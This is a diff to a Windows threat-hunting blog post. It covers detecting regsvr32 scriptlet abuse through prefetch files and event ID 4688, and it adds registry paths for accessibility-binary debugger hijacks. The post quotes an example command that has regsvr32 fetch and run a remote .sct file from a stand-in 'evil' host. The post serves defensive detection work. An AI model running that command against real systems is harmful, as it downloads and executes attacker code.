@@ -1,7 +1,7 @@
 ---
 layout: post
 classes: wide
-title:  "Threat Hunting in Windows Endpoints"
+title:  "Threat Hunting in Windows Endpoints - Part 1"
 date:   2024-12-07 01:00:00 +0800
 --- 
 This post provides details on threat hunting in the machines running in Windows operating system.  
@@ -17,7 +17,7 @@ In computing, regsvr32 (Microsoft Register Server) is a command-line utility in 
 `regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll`
 
 `regsvr32` is invoking scrobj.dll to unregister COM objects defined in the evil.sct. Malicious code will be used in the sct file.
-The SCT file ( an XML file) has a registration tag in it that can contain VBScript or JScript code.  The file can have any extension.It doesn’t have to be `.sct`. There will be no artifacts left in registry if this utility is unregistering any COM object.
+The SCT file ( an XML file) has a registration tag in it that can contain VBScript or JScript code.  The file can have any extension.It does not have to be `.sct`. There will be no artifacts left in registry if this utility is unregistering any COM object.
 
 <u>Detection:</u>
 - Look for regsvr32.exe prefetch files and Parsing the prefetch will provide the executed file. 
@@ -26,8 +26,6 @@ The SCT file ( an XML file) has a registration tag in it that can contain VBScri
 - Hunt for Windows event id 4688 and filter the command arguments with following filter
 `regSvr32 /s /n /u /i:http`
 
-Note: This utility invokes default HTTP useragent based on your system settings.
-Mozilla/4.0 (compatible; MSIE X.0; Windows NT 6.2; Win64; x64; Trident/7.0; .NET4.0E; .NET4.0C)
 
 Note: Auditing policy for process tracking have to be enabled to trigger 4688 event id and in Advanced Audit Configuration ,
 Detailed Tracking have to be enabled for recording process command arguments.
@@ -56,6 +54,12 @@ displayswitch.exe
 <u>Detection:</u>
   Sweep all the executables under below mentioned registry path  "Image File Execution Options" and look for "debugger" key name.
   
+Registry Path:
+- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
+- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe
+- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe
+- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe
+- HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe
 
 ### **<u>Bypass Proxy using WMIC</u>**
 
